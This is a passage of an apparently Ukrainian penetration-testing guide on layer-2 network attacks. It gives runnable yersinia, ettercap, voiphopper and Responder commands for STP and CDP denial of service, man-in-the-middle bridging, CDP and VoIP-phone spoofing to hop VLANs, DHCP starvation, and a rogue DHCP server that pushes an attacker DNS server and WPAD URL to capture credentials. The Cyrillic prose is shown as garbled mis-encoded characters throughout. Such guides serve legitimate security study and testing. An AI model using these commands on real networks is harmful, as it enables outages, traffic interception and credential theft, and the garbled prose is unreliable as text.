**–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏–π –¥–æ 2 –∫–æ–º—É—Ç–∞—Ç–æ—Ä—ñ–≤, –≤—ñ–Ω –º–æ–∂–µ –±—É—Ç–∏ –∫–æ—Ä–µ–Ω–µ–º –Ω–æ–≤–æ–≥–æ –¥–µ—Ä–µ–≤–∞, —ñ –≤–µ—Å—å —Ç—Ä–∞—Ñ—ñ–∫ –º—ñ–∂ —Ü–∏–º–∏ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞–º–∏ –±—É–¥–µ –ø—Ä–æ—Ö–æ–¥–∏—Ç–∏ —á–µ—Ä–µ–∑ –Ω—å–æ–≥–æ** (–±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ –∞—Ç–∞–∫—É MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### –ê—Ç–∞–∫–∏ CDP

–ü—Ä–æ—Ç–æ–∫–æ–ª –≤–∏—è–≤–ª–µ–Ω–Ω—è CISCO (CDP) —î –≤–∞–∂–ª–∏–≤–∏–º –¥–ª—è –∑–≤'—è–∑–∫—É –º—ñ–∂ –ø—Ä–∏—Å—Ç—Ä–æ—è–º–∏ CISCO, —â–æ –¥–æ–∑–≤–æ–ª—è—î —ó–º **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –æ–¥–∏–Ω –æ–¥–Ω–æ–≥–æ —Ç–∞ –æ–±–º—ñ–Ω—é–≤–∞—Ç–∏—Å—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏**.

#### –ü–∞—Å–∏–≤–Ω–∏–π –∑–±—ñ—Ä –¥–∞–Ω–∏—Ö <a href="#0e0f" id="0e0f"></a>

CDP –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –Ω–∞ —Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ –≤—Å—ñ –ø–æ—Ä—Ç–∏, —â–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Ä–∏–∑–∏–∫—É –±–µ–∑–ø–µ–∫–∏. –ê—Ç–∞–∫—É—é—á–∏–π, –ø—ñ–¥–∫–ª—é—á–∏–≤—à–∏—Å—å –¥–æ –ø–æ—Ä—Ç—É –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Å–Ω—ñ—Ñ–µ—Ä–∏ –º–µ—Ä–µ–∂—ñ, —Ç–∞–∫—ñ —è–∫ **Wireshark**, **tcpdump** –∞–±–æ **Yersinia**. –¶—è –¥—ñ—è –º–æ–∂–µ —Ä–æ–∑–∫—Ä–∏—Ç–∏ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ –ø—Ä–æ –º–µ—Ä–µ–∂–µ–≤–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π, –≤–∫–ª—é—á–∞—é—á–∏ –π–æ–≥–æ –º–æ–¥–µ–ª—å —Ç–∞ –≤–µ—Ä—Å—ñ—é Cisco IOS, —è–∫—É –≤—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î. –ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ —Å–ø—Ä—è–º—É–≤–∞—Ç–∏ —Å–≤–æ—é —É–≤–∞–≥—É –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ–π –≤–µ—Ä—Å—ñ—ó Cisco IOS.

#### –í–∏–∫–ª–∏–∫–∞–Ω–Ω—è –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è —Ç–∞–±–ª–∏—Ü—ñ CDP <a href="#0d6a" id="0d6a"></a>

–ë—ñ–ª—å—à –∞–≥—Ä–µ—Å–∏–≤–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –∑–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏ –≤—ñ–¥–º–æ–≤–∏ –≤ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ (DoS), –ø–µ—Ä–µ–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ –ø–∞–º'—è—Ç—å –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, –ø—Ä–µ—Ç–µ–Ω–¥—É—é—á–∏ –Ω–∞ –ª–µ–≥—ñ—Ç–∏–º–Ω—ñ –ø—Ä–∏—Å—Ç—Ä–æ—ó CISCO. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–∞ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å –∫–æ–º–∞–Ω–¥ –¥–ª—è –∑–∞–ø—É—Å–∫—É —Ç–∞–∫–æ—ó –∞—Ç–∞–∫–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Yersinia, –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ–≥–æ –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
–ü—ñ–¥ —á–∞—Å —Ü—å–æ–≥–æ –Ω–∞–ø–∞–¥—É –ø—Ä–æ—Ü–µ—Å–æ—Ä –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞ —Ç–∞ —Ç–∞–±–ª–∏—Ü—è —Å—É—Å—ñ–¥—ñ–≤ CDP –∑–Ω–∞—á–Ω–æ –ø–µ—Ä–µ–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è, —â–æ —á–∞—Å—Ç–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Ç–∞–∫ –∑–≤–∞–Ω–æ—ó **¬´–º–µ—Ä–µ–∂–µ–≤–æ—ó –ø–∞—Ä–∞–ª—ñ–∑–∞—Ü—ñ—ó¬ª** —á–µ—Ä–µ–∑ –Ω–∞–¥–º—ñ—Ä–Ω–µ —Å–ø–æ–∂–∏–≤–∞–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤. 

#### –ê—Ç–∞–∫–∞ —ñ–º—ñ—Ç–∞—Ü—ñ—ó CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**scapy**](https://github.com/secdev/scapy/). –û–±–æ–≤'—è–∑–∫–æ–≤–æ –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –π–æ–≥–æ –∑ –ø–∞–∫–µ—Ç–æ–º `scapy/contrib`.

### –ê—Ç–∞–∫–∏ –Ω–∞ VoIP —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç VoIP Hopper

–¢–µ–ª–µ—Ñ–æ–Ω–∏ VoIP, —è–∫—ñ –≤—Å–µ –±—ñ–ª—å—à–µ —ñ–Ω—Ç–µ–≥—Ä—É—é—Ç—å—Å—è –∑ –ø—Ä–∏—Å—Ç—Ä–æ—è–º–∏ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É —Ä–µ—á–µ–π, –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª, —Ç–∞–∫–∏–π —è–∫ –≤—ñ–¥–∫—Ä–∏–≤–∞–Ω–Ω—è –¥–≤–µ—Ä–µ–π –∞–±–æ –∫–µ—Ä—É–≤–∞–Ω–Ω—è —Ç–µ—Ä–º–æ—Å—Ç–∞—Ç–∞–º–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–∏—Ö —Ç–µ–ª–µ—Ñ–æ–Ω–Ω–∏—Ö –Ω–æ–º–µ—Ä—ñ–≤. –û–¥–Ω–∞–∫ —Ü—è —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –º–æ–∂–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∑–∞–≥—Ä–æ–∑—É –±–µ–∑–ø–µ—Ü—ñ.

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**voiphopper**](http://voiphopper.sourceforge.net) –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –µ–º—É–ª—è—Ü—ñ—ó —Ç–µ–ª–µ—Ñ–æ–Ω—É VoIP –≤ —Ä—ñ–∑–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö (Cisco, Avaya, Nortel, Alcatel-Lucent). –í—ñ–Ω –≤–∏—è–≤–ª—è—î —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä VLAN –≥–æ–ª–æ—Å–æ–≤–æ—ó –º–µ—Ä–µ–∂—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ CDP, DHCP, LLDP-MED —Ç–∞ 802.1Q ARP.

**VoIP Hopper** –ø—Ä–æ–ø–æ–Ω—É—î —Ç—Ä–∏ —Ä–µ–∂–∏–º–∏ –¥–ª—è –ø—Ä–æ—Ç–æ–∫–æ–ª—É –≤–∏—è–≤–ª–µ–Ω–Ω—è Cisco (CDP):

1. **–†–µ–∂–∏–º –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—è** (`-c 0`): –ê–Ω–∞–ª—ñ–∑—É—î –º–µ—Ä–µ–∂–µ–≤—ñ –ø–∞–∫–µ—Ç–∏ –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞ VLAN.
2. **–†–µ–∂–∏–º –ø—ñ–¥—Ä–æ–±–∫–∏** (`-c 1`): –ì–µ–Ω–µ—Ä—É—î –≤–ª–∞—Å–Ω—ñ –ø–∞–∫–µ—Ç–∏, —â–æ —ñ–º—ñ—Ç—É—é—Ç—å –ø–∞–∫–µ—Ç–∏ —Ä–µ–∞–ª—å–Ω–æ–≥–æ –ø—Ä–∏—Å—Ç—Ä–æ—é VoIP.
3. **–†–µ–∂–∏–º –ø—ñ–¥—Ä–æ–±–∫–∏ –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ —Å—Ç–≤–æ—Ä–µ–Ω–∏–º –ø–∞–∫–µ—Ç–æ–º** (`-c 2`): –ù–∞–¥—Å–∏–ª–∞—î –ø–∞–∫–µ—Ç–∏, —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ –ø–∞–∫–µ—Ç–∞–º –ø–µ–≤–Ω–æ—ó –º–æ–¥–µ–ª—ñ IP-—Ç–µ–ª–µ—Ñ–æ–Ω—É Cisco.

–ü–µ—Ä–µ–≤–∞–≥—É —Å–ª—ñ–¥ –Ω–∞–¥–∞–≤–∞—Ç–∏ —Ç—Ä–µ—Ç—å–æ–º—É —Ä–µ–∂–∏–º—É –¥–ª—è —à–≤–∏–¥–∫–æ—Å—Ç—ñ. –î–ª—è –π–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–∞–∑–∞—Ç–∏:

- –ú–µ—Ä–µ–∂–µ–≤–∏–π —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å –∞—Ç–∞–∫—É—é—á–æ–≥–æ (`-i` –ø–∞—Ä–∞–º–µ—Ç—Ä).
- –ù–∞–∑–≤—É –µ–º—É–ª—å–æ–≤–∞–Ω–æ–≥–æ –ø—Ä–∏—Å—Ç—Ä–æ—é VoIP (`-E` –ø–∞—Ä–∞–º–µ—Ç—Ä), –¥–æ—Ç—Ä–∏–º—É—é—á–∏—Å—å —Ñ–æ—Ä–º–∞—Ç—É –Ω–∞–π–º–µ–Ω—É–≤–∞–Ω–Ω—è Cisco (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, SEP, –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î MAC-–∞–¥—Ä–µ—Å–∞).

–£ –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–∏—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è—Ö –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó —ñ—Å–Ω—É—é—á–æ–≥–æ –ø—Ä–∏—Å—Ç—Ä–æ—é VoIP –º–æ–∂–Ω–∞:

- –ü–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –º—ñ—Ç–∫—É MAC –Ω–∞ —Ç–µ–ª–µ—Ñ–æ–Ω—ñ.
- –ü–µ—Ä–µ–π—Ç–∏ –¥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –¥–∏—Å–ø–ª–µ—è —Ç–µ–ª–µ—Ñ–æ–Ω—É, —â–æ–± –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –º–æ–¥–µ–ª—å.
- –ü—ñ–¥–∫–ª—é—á–∏—Ç–∏ –ø—Ä–∏—Å—Ç—Ä—ñ–π VoIP –¥–æ –Ω–æ—É—Ç–±—É–∫–∞ —Ç–∞ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—Ç–∏ –∑–∞ –∑–∞–ø–∏—Ç–∞–º–∏ CDP –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Wireshark.

–ü—Ä–∏–∫–ª–∞–¥ –∫–æ–º–∞–Ω–¥–∏ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É —É —Ç—Ä–µ—Ç—å–æ–º—É —Ä–µ–∂–∏–º—ñ:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### –ê—Ç–∞–∫–∏ DHCP

#### –ü–µ—Ä–µ–ª—ñ–∫
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

–Ü—Å–Ω—É—é—Ç—å **–¥–≤–∞ —Ç–∏–ø–∏ DoS** –∞—Ç–∞–∫, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –ø—Ä–æ—Ç–∏ —Å–µ—Ä–≤–µ—Ä—ñ–≤ DHCP. –ü–µ—Ä—à–∏–π –ø–æ–ª—è–≥–∞—î –≤ **—ñ–º—ñ—Ç–∞—Ü—ñ—ó –¥–æ—Å—Ç–∞—Ç–Ω—å–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Ñ–∞–ª—å—à–∏–≤–∏—Ö —Ö–æ—Å—Ç—ñ–≤ –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Å—ñ—Ö –º–æ–∂–ª–∏–≤–∏—Ö IP-–∞–¥—Ä–µ—Å**.

–¶—è –∞—Ç–∞–∫–∞ –±—É–¥–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –ª–∏—à–µ —É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –±–∞—á–∏—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –≤—ñ–¥ —Å–µ—Ä–≤–µ—Ä–∞ DHCP —Ç–∞ –∑–∞–≤–µ—Ä—à–∏—Ç–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª (**Discover** (–ö–æ–º–ø) --> **Offer** (—Å–µ—Ä–≤–µ—Ä) --> **Request** (–ö–æ–º–ø) --> **ACK** (—Å–µ—Ä–≤–µ—Ä)). –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —Ü–µ **–Ω–µ–º–æ–∂–ª–∏–≤–æ –≤ –±–µ–∑–¥—Ä–æ—Ç–æ–≤–∏—Ö –º–µ—Ä–µ–∂–∞—Ö**.

–Ü–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ DHCP DoS –ø–æ–ª—è–≥–∞—î –≤ –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—ñ –ø–∞–∫–µ—Ç—É **DHCP-RELEASE, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —è–∫ –¥–∂–µ—Ä–µ–ª–æ –∫–æ–¥—É –∫–æ–∂–Ω—É –º–æ–∂–ª–∏–≤—É IP-–∞–¥—Ä–µ—Å—É**. –ü–æ—Ç—ñ–º —Å–µ—Ä–≤–µ—Ä –±—É–¥–µ –≤–≤–∞–∂–∞—Ç–∏, —â–æ –≤—Å—ñ –∑–∞–∫—ñ–Ω—á–∏–ª–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
–ë—ñ–ª—å—à –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏–º —Å–ø–æ—Å–æ–±–æ–º —Ü–µ —Ä–æ–±–∏—Ç–∏ —î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É [DHCPing](https://github.com/kamorin/DHCPig)

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑–≥–∞–¥–∞–Ω—ñ –∞—Ç–∞–∫–∏ DoS, —â–æ–± –∑–º—É—Å–∏—Ç–∏ –∫–ª—ñ—î–Ω—Ç—ñ–≤ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –Ω–æ–≤—ñ –ª—ñ–∑–∏–Ω–≥–∏ –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ, —Ç–∞ –≤–∏—á–µ—Ä–ø–∞—Ç–∏ –∑–∞–∫–æ–Ω–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∏, —â–æ–± –≤–æ–Ω–∏ —Å—Ç–∞–ª–∏ –Ω–µ—Å–ø—Ä–∞–≤–Ω–∏–º–∏. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∫–æ–ª–∏ –∑–∞–∫–æ–Ω–Ω—ñ —Å–ø—Ä–æ–±—É—é—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è, **–≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥–∞—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è, –∑–∞–∑–Ω–∞—á–µ–Ω—ñ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∞—Ç–∞–∫—ñ**.

#### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–∏—Ö –∑–Ω–∞—á–µ–Ω—å

–ó–ª–æ–≤–º–∏—Å–Ω–∏–π DHCP —Å–µ—Ä–≤–µ—Ä –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–∫—Ä–∏–ø—Ç—É DHCP, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–æ–≥–æ –∑–∞ —à–ª—è—Ö–æ–º `/usr/share/responder/DHCP.py`. –¶–µ –∫–æ—Ä–∏—Å–Ω–æ –¥–ª—è –º–µ—Ä–µ–∂–µ–≤–∏—Ö –∞—Ç–∞–∫, —Ç–∞–∫–∏—Ö —è–∫ –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è HTTP —Ç—Ä–∞—Ñ—ñ–∫—É —Ç–∞ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—á–∏ —Ç—Ä–∞—Ñ—ñ–∫ –Ω–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–π —Å–µ—Ä–≤–µ—Ä. –û–¥–Ω–∞–∫ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ —à–ª—é–∑—É –º–µ–Ω—à –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–æ–Ω–æ –¥–æ–∑–≤–æ–ª—è—î –ª–∏—à–µ –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –≤–∏—Ö—ñ–¥–Ω–∏–π —Ç—Ä–∞—Ñ—ñ–∫ –≤—ñ–¥ –∫–ª—ñ—î–Ω—Ç–∞, –ø—Ä–æ–ø—É—Å–∫–∞—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ –≤—ñ–¥ —Ä–µ–∞–ª—å–Ω–æ–≥–æ —à–ª—é–∑—É. –ó–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–π DNS –∞–±–æ —Å–µ—Ä–≤–µ—Ä WPAD –¥–ª—è –±—ñ–ª—å—à –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—ó –∞—Ç–∞–∫–∏.

–ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –∫–æ–º–∞–Ω–¥ –¥–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ DHCP —Å–µ—Ä–≤–µ—Ä–∞:

- **–ù–∞—à IP-–∞–¥—Ä–µ—Å–∞ (–û–≥–æ–ª–æ—à–µ–Ω–Ω—è —à–ª—é–∑—É)**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-i 10.0.0.100`, —â–æ–± –æ–≥–æ–ª–æ—Å–∏—Ç–∏ IP-–∞–¥—Ä–µ—Å—É –≤–∞—à–æ–≥–æ –∫–æ–º–ø'—é—Ç–µ—Ä–∞ —è–∫ —à–ª—é–∑.
- **–õ–æ–∫–∞–ª—å–Ω–µ –¥–æ–º–µ–Ω–Ω–µ —ñ–º'—è DNS**: –û–ø—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-d example.org`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–µ –¥–æ–º–µ–Ω–Ω–µ —ñ–º'—è DNS.
- **–û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π IP-–∞–¥—Ä–µ—Å–∞ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞/—à–ª—é–∑—É**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-r 10.0.0.1`, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ IP-–∞–¥—Ä–µ—Å—É –∑–∞–∫–æ–Ω–Ω–æ–≥–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞ –∞–±–æ —à–ª—é–∑—É.
- **IP-–∞–¥—Ä–µ—Å–∞ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ DNS —Å–µ—Ä–≤–µ—Ä–∞**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-p 10.0.0.100`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ IP-–∞–¥—Ä–µ—Å—É –∑–ª–æ–≤–º–∏—Å–Ω–æ–≥–æ DNS —Å–µ—Ä–≤–µ—Ä–∞, —è–∫–∏–º –≤–∏ –∫–µ—Ä—É—î—Ç–µ.
- **IP-–∞–¥—Ä–µ—Å–∞ –≤—Ç–æ—Ä–∏–Ω–Ω–æ–≥–æ DNS —Å–µ—Ä–≤–µ—Ä–∞**: –û–ø—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-s 10.0.0.1`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ IP-–∞–¥—Ä–µ—Å—É –≤—Ç–æ—Ä–∏–Ω–Ω–æ–≥–æ DNS —Å–µ—Ä–≤–µ—Ä–∞.
- **–ú–∞—Å–∫–∞ –ø—ñ–¥–º–µ—Ä–µ–∂—ñ –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-n 255.255.255.0`, —â–æ–± –≤–∏–∑–Ω–∞—á–∏—Ç–∏ –º–∞—Å–∫—É –ø—ñ–¥–º–µ—Ä–µ–∂—ñ –¥–ª—è –ª–æ–∫–∞–ª—å–Ω–æ—ó –º–µ—Ä–µ–∂—ñ.
- **–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å –¥–ª—è —Ç—Ä–∞—Ñ—ñ–∫—É DHCP**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-I eth1`, —â–æ–± –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞—Ç–∏ —Ç—Ä–∞—Ñ—ñ–∫ DHCP –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É –º–µ—Ä–µ–∂–µ–≤–æ–º—É —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ.
- **–ê–¥—Ä–µ—Å–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó WPAD**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `-w ‚Äúhttp://10.0.0.100/wpad.dat‚Äù`, —â–æ–± –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –∞–¥—Ä–µ—Å—É –¥–ª—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó WPAD, –¥–æ–ø–æ–º–∞–≥–∞—é—á–∏ –≤ –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–Ω—ñ –≤–µ–±-—Ç—Ä–∞—Ñ—ñ–∫—É.
- **–ü—ñ–¥—Ä–æ–±–ª–µ–Ω–∞ IP-–∞–¥—Ä–µ—Å–∞ —Ç–∏–ø–æ–≤–æ–≥–æ —à–ª—é–∑—É**: –í–∫–ª—é—á—ñ—Ç—å `-S`, —â–æ–± –ø—ñ–¥—Ä–æ–±–∏—Ç–∏ IP-–∞–¥—Ä–µ—Å—É —Ç–∏–ø–æ–≤–æ–≥–æ —à–ª—é–∑—É.
- **–í—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –≤—Å—ñ –∑–∞–ø–∏—Ç–∏ DHCP**: –í–∫–ª—é—á—ñ—Ç—å `-R`, —â–æ–± —Å–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–≤ –Ω–∞ –≤—Å—ñ –∑–∞–ø–∏—Ç–∏ DHCP, –∞–ª–µ –ø–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ —Ü–µ —à—É–º–Ω–æ —ñ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏—è–≤–ª–µ–Ω–æ.

